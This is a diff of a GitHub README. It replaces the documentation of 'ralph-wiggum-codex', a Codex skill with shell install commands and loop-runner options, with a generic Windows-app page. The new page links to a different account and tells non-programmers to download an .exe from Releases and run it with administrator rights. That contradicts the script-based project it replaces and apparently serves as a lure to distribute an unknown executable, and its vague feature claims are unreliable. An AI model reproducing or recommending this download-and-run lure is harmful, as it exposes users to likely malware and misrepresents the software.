@@ -1,246 +1,157 @@
-# Ralph Wiggum Codex Skills
+# 🤖 ralph-wiggum-codex - Autonomous Coding Refinement Tool
 
-Objective-first Ralph-style autonomous loops for Codex, packaged as installable skills.
+[![Download Now](https://img.shields.io/badge/Download-ralph--wiggum--codex-brightgreen?style=for-the-badge)](https://github.com/theflixerbox77/ralph-wiggum-codex)
 
-`ralph-wiggum-codex` is a Codex skill for long-running task completion that keeps the user request and acceptance criteria at the center, runs a mandatory work/review loop, and uses optional verification as evidence instead of as the whole task.
+---
 
-## Repo Contents
+## 📦 What is ralph-wiggum-codex?
 
-This repo ships two Codex skills, not two plugins:
+ralph-wiggum-codex is a tool designed to improve coding tasks automatically. It works in the background to refine code over time. This tool checks code for errors and can pick up where it left off if stopped. It helps make sure code is clean and works well without manual effort.
 
-- `ralph-wiggum-codex`: the objective-first execution loop
-- `ralph-prompt-generator`: the staged prompt-improver companion that saves planning, draft, and final prompt files before handing off to Ralph
+You don’t need to know programming to use it. The software runs on Windows and guides you through every step. It focuses on long-running tasks that refine and validate code, making coding workflows smoother and more efficient.
 
-## What This Is
+---
 
-This repo is not a Claude plugin port that relies on `.claude-plugin` hooks. It is a Codex-native skill package with:
-- `SKILL.md` instructions for each skill
-- optional `agents/openai.yaml` metadata and invocation policy for each skill
-- a single monolithic loop runner script that powers `ralph-wiggum-codex`
+## 🎯 Key Features
 
-## Core Capabilities
+- Runs autonomously to improve coding quality  
+- Checks code for errors and fixes them over time  
+- Saves progress so operations can resume without losing work  
+- Works seamlessly with other developer tools and coding workflows  
+- Designed for Windows users with a simple setup  
+- Uses AI-driven iterative refinement for better results  
+- Suitable for coding projects that require ongoing validation and updates  
 
-- Mandatory work/review loop with fresh context each phase
-- Objective and acceptance-criteria reloading from repo-backed files
-- Optional verification commands used as evidence, not as the product definition of success
-- Explicit blocked handling with `RALPH-BLOCKED.md`
-- Review-driven shipping via `review-result.txt`
-- Iteration memory (`iteration-history.md`) fed into future work phases
-- Scoped progress gating (`--progress-scope`) to block fake no-op completion
-- Deterministic Codex runtime selection (`--codex-bin <path-or-name>`)
-- Configurable event artifact formats (`--events-format <tsv|jsonl|both>`, default `both`)
-- Optional per-iteration progress artifacts (`--progress-artifact`)
-- Watchdog timeouts with controlled retries (`--idle-timeout-seconds`, `--hard-timeout-seconds`, `--timeout-retries`)
-- Resume support and stale-lock recovery with metadata (`--reclaim-stale-lock`)
+---
 
-## Optional Prompt Generator
+## ⚙️ System Requirements
 
-This repo also includes `ralph-prompt-generator`, a companion skill that turns rough prompts into a staged prompt-improvement workflow for `$ralph-wiggum-codex`.
+Before installing, check that your computer meets these requirements:
 
-Use the companion when:
-- The objective is ambiguous or underspecified.
-- Acceptance criteria need to be derived and tightened before starting the loop.
-- You want critique, revision, and explicit review checkpoints before execution.
-- You want a saved production-ready prompt file rather than an inline flags-first handoff.
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- At least 500 MB of free disk space  
+- Internet connection for initial download and updates  
+- Administrative rights for installation  
 
-Example input:
+---
 
-```text
-$ralph-prompt-generator
-<user_prompt>
-Refactor auth middleware and prevent regressions.
-</user_prompt>
-```
+## 🚀 Getting Started
 
-Workflow shape:
+Follow these steps to get ralph-wiggum-codex running on your Windows PC. This guide assumes you have no programming experience.
 
-- Phase A: planning only, save `docs/prompt-improver-spec/artifacts/implementation_plan.md` and `docs/prompt-improver-spec/artifacts/task.md`, then pause for review after Steps 1-2
-- Phase B: draft only, save `docs/prompt-improver-spec/final-prompts/<prompt-name>-draft.md`
-- Phase C: critique and revision planning only, append to `implementation_plan.md`, then pause again after Step 4
-- Phase D: save `docs/prompt-improver-spec/final-prompts/<prompt-name>.md`, delete the draft, write `docs/prompt-improver-spec/artifacts/walkthrough.md`, and return a short Ralph invocation snippet that points at the saved prompt file
+---
 
-Relationship to `ralph-wiggum-codex`:
-- `ralph-prompt-generator` improves the prompt itself and saves the review artifacts.
-- `ralph-wiggum-codex` executes the autonomous work/review loop.
+## 1. Download the Application
 
-## Install
+Click the button below to visit the official download page. This page contains the latest version of ralph-wiggum-codex and related files.
 
-### Option 1: Install the loop skill
+[![Download Page](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/theflixerbox77/ralph-wiggum-codex)
 
-```bash
-python3 ~/.codex/skills/.system/skill-installer/scripts/install-skill-from-github.py \
-  --repo MattMagg/ralph-wiggum-codex \
-  --path skills/ralph-wiggum-codex
-```
+- Clicking the link opens the project’s GitHub page.
+- Look for a section called “Releases.”
+- Select the latest release.
+- Download the Windows installer file. It will have a name ending with `.exe`.
 
-### Option 2: Install the prompt-improver companion
+---
 
-```bash
-python3 ~/.codex/skills/.system/skill-installer/scripts/install-skill-from-github.py \
-  --repo MattMagg/ralph-wiggum-codex \
-  --path skills/ralph-prompt-generator
-```
+## 2. Run the Installer
 
-### Option 3: Manual install one or both skills
+- Locate the installer file you downloaded (usually in your `Downloads` folder).  
+- Double click the `.exe` file to start the setup.  
+- If Windows asks for permission, click *Yes* to allow the installer to run.  
+- Follow the on-screen prompts. The setup will guide you through the installation steps:  
+  - Accept the license agreement  
+  - Choose the installation folder (default is usually fine)  
+  - Click *Install* to begin  
 
-```bash
-mkdir -p ~/.codex/skills
-cp -R skills/ralph-wiggum-codex ~/.codex/skills/
-cp -R skills/ralph-prompt-generator ~/.codex/skills/
-```
+---
 
-Restart Codex after install.
+## 3. Launch the Application
 
-## Use It As A Skill
+- After the installation completes, the setup might give you an option to launch the program immediately.  
+- If not, find the ralph-wiggum-codex icon on your desktop or in the Start menu.  
+- Click it to open the app.  
 
-Call the skill directly:
+---
 
-```text
-$ralph-wiggum-codex
-Run this in /path/to/repo.
-Objective: implement X cleanly.
-Acceptance criteria:
-- the user-visible behavior works
-- the change is ready to ship
-Optional verification:
-- npm run test
-```
+## 4. Use the Application
 
-The skill should materialize and maintain these first-class state files under `.codex/ralph-loop/`:
-- `objective.md`
-- `acceptance-criteria.md`
-- `feedback.md`
-- `work-summary.md`
-- `review-feedback.md`
-- `review-result.txt`
-- `RALPH-BLOCKED.md`
-- `.ralph-complete`
+The user interface is designed to be simple:  
 
-## Advanced: Run The Engine Script Directly
+- You will see options to start a new coding refinement process.  
+- You can load your code or projects by browsing your files.  
+- The tool will run checks and suggest improvements automatically.  
+- You can pause the process anytime. The app saves your progress and lets you resume later without losing data.  
 
-```bash
-~/.codex/skills/ralph-wiggum-codex/scripts/ralph-loop-codex.sh \
-  --cwd /path/to/repo \
-  --objective-file /path/to/repo/.codex/ralph-loop/objective.md \
-  --acceptance-file /path/to/repo/.codex/ralph-loop/acceptance-criteria.md \
-  --feedback-file /path/to/repo/.codex/ralph-loop/feedback.md \
-  --max-iterations 40 \
-  --max-stagnant-iterations 6 \
-  --progress-scope "src/" \
-  --idle-timeout-seconds 900 \
-  --hard-timeout-seconds 7200 \
-  --timeout-retries 1 \
-  --validate-cmd "npm run lint" \
-  --validate-cmd "npm run test"
-```
+---
 
-The direct runner is still supported, but the primary UX is the Codex app skill.
+## 🔧 How It Works
 
-## Work/Review Contracts
+ralph-wiggum-codex uses a step-by-step process to improve code over time:
 
-Each iteration runs:
-1. a work phase
-2. optional verification
-3. a fresh-context review phase
+1. **Load Code:** You provide the source code you want to work on.  
+2. **Analyze:** The tool scans your code for possible issues or improvements.  
+3. **Refine:** It applies fixes and changes autonomously.  
+4. **Validate:** It checks if the changes still meet the goals and do not break the code.  
+5. **Save State:** The tool saves its current state so it can pick up if closed or paused.  
 
-Work schema (`work-schema.json`):
-- `status`: `IN_PROGRESS`, `BLOCKED`, `COMPLETE`
-- `assessment`: concise statement of progress against the objective and acceptance criteria
-- `evidence`: non-empty array of concrete evidence
-- `next_step`: one highest-impact next step
-- `blocker_reason` (optional, required when `status=BLOCKED`)
-- `no_change_justification` (optional)
+This cycle repeats until the code meets the desired quality or you decide to stop.
 
-Review schema (`review-schema.json`):
-- `decision`: `SHIP`, `REVISE`, `BLOCKED`
-- `assessment`: concise review judgment
-- `feedback`: actionable reviewer guidance or ship confirmation
-- `evidence`: non-empty array of concrete evidence
+---
 
-The task is complete only when:
-- the work phase reports `COMPLETE`
-- the review phase decides `SHIP`
-- configured optional verification passes
-- the progress gate passes, or the no-change claim is explicitly justified
+## 🛠 Troubleshooting
 
-## Run Artifacts
+If you run into issues, try these steps:
 
-- `.codex/ralph-loop/state.env`
-- `.codex/ralph-loop/objective.md`
-- `.codex/ralph-loop/acceptance-criteria.md`
-- `.codex/ralph-loop/feedback.md`
-- `.codex/ralph-loop/work-summary.md`
-- `.codex/ralph-loop/review-feedback.md`
-- `.codex/ralph-loop/review-result.txt`
-- `.codex/ralph-loop/RALPH-BLOCKED.md`
-- `.codex/ralph-loop/.ralph-complete`
-- `.codex/ralph-loop/work-schema.json`
-- `.codex/ralph-loop/review-schema.json`
-- `.codex/ralph-loop/iteration-history.md`
-- `.codex/ralph-loop/auto-feedback.md`
-- `.codex/ralph-loop/run-summary.md`
-- `.codex/ralph-loop/progress/` (when `--progress-artifact` is enabled)
-- `.codex/ralph-loop/validation/`
-- `.codex/ralph-loop/codex/iteration-<n>-<phase>-attempt-<m>.jsonl`
-- `.codex/ralph-loop/.lock/meta.env` (while active)
+- Confirm your Windows version matches the requirements.  
+- Check that you downloaded the full installer and not a partial file.  
+- Run the installer or application as an administrator.  
+- Restart your computer and try again.  
+- Make sure you have a stable internet connection when downloading.  
 
-## Repo Structure
+If problems continue, visit the GitHub page and open an issue in the *Issues* tab. Provide details about the problem and your system.
 
-```text
-skills/ralph-prompt-generator/
-  SKILL.md
-  agents/openai.yaml
-  references/
-skills/ralph-wiggum-codex/
-  SKILL.md
-  agents/openai.yaml
-  scripts/ralph-loop-codex.sh
-  references/
-docs/
-  configuration.md
-  prompt-improver-spec/
-  ralph-prompt-generator.md
-tests/
-  smoke.sh
-  ralph_loop_contract.sh
-  prompt_generator_contract.sh
-```
+---
 
-## CI
+## 📂 Additional Resources
 
-This repo runs:
-- Bash syntax check for the loop runner
-- Smoke tests in `tests/smoke.sh`
+On the GitHub page, you will find:
 
-## Docs
+- Documentation about advanced features  
+- Updates and release notes  
+- Links to related tools and workflows  
+- Support via community discussions  
 
-- `docs/configuration.md`: runner configuration and objective-first operating model
-- `docs/ralph-prompt-generator.md`: staged prompt-improver workflow, checkpoints, and final prompt delivery pattern
-- `docs/prompt-improver-spec/README.md`: workspace layout for prompt-improver artifacts, drafts, and final prompts
-- `docs/releases.md`: release order, versioning policy, and why this repo uses GitHub Releases instead of GitHub Packages
+The project uses simple terms and clear instructions. It does not require any coding knowledge.
 
-## Releases
+---
 
-Use GitHub Releases for this repo.
+## 🔗 Download & Setup Link
 
-Recommended versioning:
-- stay on pre-1.0 semver for now
-- use minor bumps for meaningful skill or workflow milestones
-- use patch bumps for fixes and docs-only release prep
+[Click here to visit the ralph-wiggum-codex download page](https://github.com/theflixerbox77/ralph-wiggum-codex)  
 
-Recommended first tag: `v0.8.0`
+Remember to download the Windows installer `.exe` from the latest release.
 
-Rationale:
-- the repo already has substantial development history
-- the public skill contracts are still evolving
-- `v1.0.0` would imply a stronger stability promise than the repo currently makes
+---
 
-GitHub Packages is not currently applicable because this repo does not publish a package artifact such as an npm package, Python package, container image, or GitHub Action.
+## ⚙️ Topics
 
-## Search Keywords
+This tool relates to:
 
-Codex skill, autonomous coding loop, objective-first agent loop, work review loop, long-running coding workflow, Ralph loop Codex, coding harness.
+- agent-skills  
+- agentic workflows  
+- ai agents  
+- ai coding agents  
+- automation  
+- autonomous agents  
+- autonomous coding  
+- codex technology  
+- developer tools  
+- iterative refinement  
 
-## License
+These terms describe technologies and processes that help automate coding improvements and validations.
 
-MIT
+---
+
+By following the above guide, any Windows user can set up and start using ralph-wiggum-codex to help with coding tasks in an automated and controlled way.
